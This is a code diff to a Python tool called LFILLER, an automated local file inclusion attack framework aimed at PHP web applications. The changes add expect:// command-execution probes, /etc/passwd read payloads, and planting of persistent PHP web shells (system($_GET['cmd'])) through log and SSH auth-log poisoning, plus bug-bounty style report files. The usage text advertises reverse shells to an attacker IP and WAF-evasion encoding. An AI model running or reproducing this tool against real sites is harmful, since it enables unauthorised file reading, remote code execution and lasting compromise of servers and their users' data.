@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
 import requests
+import os
+import json
 import urllib.parse
 import base64
 import sys
@@ -10,6 +12,8 @@ import socket
 import subprocess
 import argparse
 import concurrent.futures
+import random
+import string
 from threading import Lock
 
 # Color palette for premium feel
@@ -23,7 +27,7 @@ class Colors:
     WHITE = '\033[97m'
     END = '\033[0m'
 
-class LFI_Filler_V3:
+class LFILLER:
     def __init__(self, url, lhost=None, lport=4444, timeout=5, workers=20, 
                  custom_param=None, webshell=False, encode='none'):
         self.url = url.rstrip('/')
@@ -55,10 +59,15 @@ class LFI_Filler_V3:
             'ssh_poisoning': False,
             'rfi': False,
             'webshell_created': False,
-            'webshell_urls': []
+            'webshell_urls': [],
+            'exploitation_stories': []
         }
         
         self._initialize_comprehensive_data()
+
+    def _generate_random_name(self, length=12):
+        characters = string.ascii_letters + string.digits
+        return ''.join(random.choice(characters) for i in range(length)) + ".php"
 
     def _initialize_comprehensive_data(self):
         # Full list of parameters from original
@@ -96,7 +105,9 @@ class LFI_Filler_V3:
             '../../../../windows/system32/drivers/etc/hosts',
             'index.php', 'file.php', 'page.php',
             '/var/log/auth.log',
-            '/proc/self/environ'
+            '/proc/self/environ',
+            '!/etc!/passwd',
+            'jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
         ]
         
         self.php_wrappers = [
@@ -107,7 +118,8 @@ class LFI_Filler_V3:
             ('data://text/plain,<?php echo "TEST"; ?>', 'Data Wrapper'),
             ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
             ('php://input', 'PHP Input'),
-            ('expect://whoami', 'Expect Wrapper'),
+            ('expect://id', 'Expect Wrapper (RCE)'),
+            ('expect://whoami', 'Expect Wrapper (RCE)'),
             ('zip:///etc/passwd%23test', 'Zip Wrapper'),
             ('phar:///etc/passwd', 'Phar Wrapper')
         ]
@@ -228,6 +240,9 @@ class LFI_Filler_V3:
                             except: pass
                         elif "data://" in wrapper or "php://input" in wrapper:
                             if 'WRAPPER_TEST' in r.text or 'TEST' in r.text: success = True
+                        elif "expect://" in wrapper:
+                            if 'uid=' in r.text or 'gid=' in r.text or r.text.strip() == "www-data":
+                                success = True
                         
                         if success:
                             with self.lock:
@@ -328,9 +343,12 @@ class LFI_Filler_V3:
     def create_webshell(self, param):
         if not self.webshell_mode: return
         print(f"\n[*] Attempting web shell creation...")
+        
+        random_filename = self._generate_random_name()
         shell_code = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } else { echo "Web shell active! Use ?cmd=WHOAMI"; } ?>'
+        
         # Try both Linux and Windows common paths
-        locations = ['/var/www/html/shell.php', 'shell.php', 'C:/xampp/htdocs/shell.php']
+        locations = [random_filename, f'/var/www/html/{random_filename}', f'C:/xampp/htdocs/{random_filename}']
         
         success = False
         
@@ -345,12 +363,19 @@ class LFI_Filler_V3:
                         time.sleep(1)
                         
                         # Verify
-                        check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
+                        check_url = f"{self.url.rsplit('/', 1)[0]}/{random_filename}"
                         r = self.session.get(check_url, timeout=2)
-                        if 'system(' not in r.text and r.status_code == 200: # If we see code OR if it executes
+                        if 'system(' not in r.text and r.status_code == 200:
                             with self.lock:
                                 self.results['webshell_urls'].append(check_url)
-                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via log poisoning")
+                                story = f"CHAIN: LFI -> Log Poisoning -> RCE\n"
+                                story += f"1. Identified LFI on parameter '{param}'\n"
+                                story += f"2. Confirmed readable log at '{p['log']}'\n"
+                                story += f"3. Poisoned '{p['log']}' by sending PHP code in User-Agent header\n"
+                                story += f"4. Included poisoned log via LFI with command 'echo payload > {loc}'\n"
+                                story += f"5. Verified shell at {check_url}"
+                                self.results['exploitation_stories'].append(story)
+                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {Colors.CYAN}{check_url}{Colors.END}")
                                 success = True
                                 break
                     except: continue
@@ -366,12 +391,19 @@ class LFI_Filler_V3:
                     self.session.get(f"{log_url}&ssh_cmd={urllib.parse.quote(payload)}", timeout=3)
                     time.sleep(1)
                     
-                    check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
+                    check_url = f"{self.url.rsplit('/', 1)[0]}/{random_filename}"
                     r = self.session.get(check_url, timeout=2)
                     if r.status_code == 200:
                         with self.lock:
                             self.results['webshell_urls'].append(check_url)
-                            print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via SSH poisoning")
+                            story = f"CHAIN: LFI -> SSH Poisoning -> RCE\n"
+                            story += f"1. Identified LFI on parameter '{param}'\n"
+                            story += f"2. Confirmed readable auth log at '/var/log/auth.log'\n"
+                            story += f"3. Targeted target IP for SSH connection, sending PHP code as username\n"
+                            story += f"4. Included auth log via LFI with command to write persistent shell to '{loc}'\n"
+                            story += f"5. Verified shell at {check_url}"
+                            self.results['exploitation_stories'].append(story)
+                            print(f" {Colors.GREEN}[+]{Colors.END} Web shell created: {Colors.CYAN}{check_url}{Colors.END}")
                             success = True
                             break
                 except: continue
@@ -584,18 +616,94 @@ class LFI_Filler_V3:
             self.check_rfi(p)
             self.execute_shells(p)
             if self.webshell_mode: self.create_webshell(p)
-
+ 
         self._display_summary()
+        self._generate_report()
+
+    def _generate_report(self):
+        """Creates target folder and saves detailed bounty reports"""
+        try:
+            domain = urllib.parse.urlparse(self.url).netloc.replace(':', '_')
+            if not domain: domain = "general_results"
+            
+            if not os.path.exists(domain):
+                os.makedirs(domain)
+        except:
+            domain = "audit_report"
+            if not os.path.exists(domain): os.makedirs(domain)
+
+        print(f"\n[*] {Colors.YELLOW}Generating Industrial Bounty Reports in {Colors.BOLD}{domain}/{Colors.END}...")
+        
+        report_count = 0
+        
+        # 1. LFI Parameter Reports
+        for i, res in enumerate(self.results['lfi_params'], 1):
+            report_count += 1
+            filename = os.path.join(domain, f"bounty_LFI_{i}.txt")
+            with open(filename, "w") as f:
+                f.write(f"VULNERABILITY: Local File Inclusion (LFI)\n")
+                f.write("="*40 + "\n")
+                f.write(f"Target: {self.url}\n")
+                f.write(f"Parameter: {res['param']}\n")
+                f.write(f"Payload: {res['payload']}\n\n")
+                f.write("EXPLANATION:\n")
+                f.write("The application fails to properly validate the input parameter, allowing an attacker to include arbitrary local files. This can lead to sensitive information disclosure (e.g., /etc/passwd) or Remote Code Execution (RCE).\n\n")
+                f.write("MANUAL REPRODUCTION STEPS:\n")
+                f.write(f"1. Navigate to the following URL in your browser:\n   {res['url']}\n")
+                f.write(f"2. Observe the content of the system file (e.g., /etc/passwd) rendered in the response.\n\n")
+                f.write("EVIDENCE OF PROOF:\n")
+                f.write(f"Command: curl -i \"{res['url']}\"\n")
+                f.write("-" * 40 + "\n")
+
+        # 2. Wrapper Reports
+        for i, (name, wrapper, url) in enumerate(self.results['php_wrappers'], 1):
+            report_count += 1
+            filename = os.path.join(domain, f"bounty_WRAPPER_{i}.txt")
+            with open(filename, "w") as f:
+                f.write(f"VULNERABILITY: PHP Wrapper Exploitation ({name})\n")
+                f.write("="*40 + "\n")
+                f.write(f"Target: {self.url}\n")
+                f.write(f"Wrapper: {wrapper}\n\n")
+                f.write("MANUAL REPRODUCTION STEPS:\n")
+                f.write(f"1. Use the following payload to trigger the wrapper:\n   {url}\n")
+                f.write("2. Observe sensitive data or code execution.\n")
+
+        # 3. WebShell Reports
+        for i, url in enumerate(self.results['webshell_urls'], 1):
+            report_count += 1
+            filename = os.path.join(domain, f"bounty_WEBSHELL_{i}.txt")
+            story = self.results['exploitation_stories'][i-1] if i-1 < len(self.results['exploitation_stories']) else "Persistent Webshell Created."
+            with open(filename, "w") as f:
+                f.write(f"VULNERABILITY: Remote Code Execution (RCE) via WebShell\n")
+                f.write("="*40 + "\n")
+                f.write(f"Target Base: {self.url}\n")
+                f.write(f"WebShell URL: {url}\n\n")
+                f.write("EXPLANATION:\n")
+                f.write("A critical vulnerability chain was identified allowing for the placement of a persistent web shell. This allows full administrative access to the underlying operating system.\n\n")
+                f.write("EXPLOITATION CHAIN & MANUAL REPRODUCTION:\n")
+                f.write(story + "\n\n")
+                f.write("VERIFICATION STEPS:\n")
+                f.write(f"1. Open the following URL to confirm execution:\n   {url}?cmd=id\n")
+                f.write(f"2. Payload command executed to verify: 'id'\n")
+                f.write(f"3. Expected output snippet: 'uid=... gid=...'\n\n")
+                f.write("IMPACT:\n")
+                f.write("Critical. Full system compromise. An attacker can execute arbitrary commands, access sensitive data, and pivot within the internal network.\n")
+
+        # Save results to JSON for automation
+        with open(os.path.join(domain, "findings.json"), "w") as f:
+            json.dump(self.results, f, indent=4)
+
+        print(f"[+] {Colors.GREEN}Report Generation Complete!{Colors.END} {report_count} reports saved to {domain}/")
 
     def _print_banner(self):
         banner = f"""{Colors.BLUE}
-    ██╗     ███████╗██╗     ███████╗██╗██╗     ██╗     ███████╗██████╗ 
-    ██║     ██╔════╝██║     ██╔════╝██║██║     ██║     ██╔════╝██╔══██╗
-    ██║     █████╗  ██║     █████╗  ██║██║     ██║     █████╗  ██████╔╝
-    ██║     ██╔══╝  ██║     ██╔══╝  ██║██║     ██║     ██╔══╝  ██╔══██╗
-    ███████╗██║     ██║     ██║     ██║███████╗███████╗███████╗██║  ██║
-    ╚══════╝╚═╝     ╚═╝     ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
-    {Colors.END}                 {Colors.BOLD}v3.0 - Comprehensive LFI Framework{Colors.END}
+ ██╗     ███████╗██╗██╗     ██╗     ███████╗██████╗ 
+ ██║     ██╔════╝██║██║     ██║     ██╔════╝██╔══██╗
+ ██║     █████╗  ██║██║     ██║     █████╗  ██████╔╝
+ ██║     ██╔══╝  ██║██║     ██║     ██╔══╝  ██╔══██╗
+ ███████╗██║     ██║███████╗███████╗███████╗██║  ██║
+ ╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+{Colors.END}                 {Colors.BOLD}v3.0 - Industrial LFILLER{Colors.END}
         """
         print(banner)
 
@@ -636,7 +744,7 @@ class LFI_Filler_V3:
 
 def main():
     parser = argparse.ArgumentParser(
-        description='LFI-FILLER v3.0 - Advanced Multi-threaded Scanner',
+        description='LFILLER v3.0 - Industrial LFI Framework',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 ╔══════════════════════════════════════════════════════════╗
@@ -644,25 +752,25 @@ def main():
 ╚══════════════════════════════════════════════════════════╝
 
 BASIC USAGE:
-  python3 lfi_filler_v3.py -u http://target.com/page.php
+  python3 lfiller.py -u http://target.com/page.php
 
 WITH REVERSE SHELL (requires listener):
-  python3 lfi_filler_v3.py -u http://target.com/page.php -lh YOUR_IP -lp 4444
+  python3 lfiller.py -u http://target.com/page.php -lh YOUR_IP -lp 4444
 
 WEB SHELL MODE (creates PHP web shells instead of reverse shells):
-  python3 lfi_filler_v3.py -u http://target.com/page.php -webshell
+  python3 lfiller.py -u http://target.com/page.php -webshell
 
 CUSTOM PARAMETER (bypasses default list):
-  python3 lfi_filler_v3.py -u http://target.com/page.php -p water
+  python3 lfiller.py -u http://target.com/page.php -p water
 
 ENCODING BYPASS (for WAF evasion):
-  python3 lfi_filler_v3.py -u http://target.com/page.php -e url
-  python3 lfi_filler_v3.py -u http://target.com/page.php -e double
-  python3 lfi_filler_v3.py -u http://target.com/page.php -e unicode
-  python3 lfi_filler_v3.py -u http://target.com/page.php -e all
+  python3 lfiller.py -u http://target.com/page.php -e url
+  python3 lfiller.py -u http://target.com/page.php -e double
+  python3 lfiller.py -u http://target.com/page.php -e unicode
+  python3 lfiller.py -u http://target.com/page.php -e all
 
 COMBINED ATTACK:
-  python3 lfi_filler_v3.py -u http://target.com/page.php -lh YOUR_IP -e all -webshell
+  python3 lfiller.py -u http://target.com/page.php -lh YOUR_IP -e all -webshell
 
 ╔══════════════════════════════════════════════════════════╗
 ║                 FLAG DESCRIPTIONS                        ║
@@ -725,7 +833,7 @@ For reverse shells:
     parser.add_argument('-webshell', '--webshell', action='store_true', help='Web shell mode')
     
     args = parser.parse_args()
-    scanner = LFI_Filler_V3(
+    scanner = LFILLER(
         url=args.url, 
         workers=args.workers, 
         timeout=args.timeout,
